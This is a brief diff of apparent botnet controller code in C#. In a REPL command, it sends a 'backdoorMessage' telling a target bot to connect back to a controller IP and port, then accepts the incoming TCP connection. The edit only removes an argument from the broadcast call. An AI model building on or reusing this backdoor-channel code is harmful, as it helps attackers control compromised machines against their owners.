@@ -68,7 +68,7 @@ namespace REPL.Commands
                     TargetBotId = BotIdentifier.Parse(botId),
                     ControllerEndpoint = new IPEndPoint( controllerIp, port)
                 };
-                _agent.MessagesManager.Broadcast(backdoorMessage, 6);
+                _agent.MessagesManager.Broadcast(backdoorMessage);
 
                 var client = server.AcceptTcpClient();
                 var stream = client.GetStream();
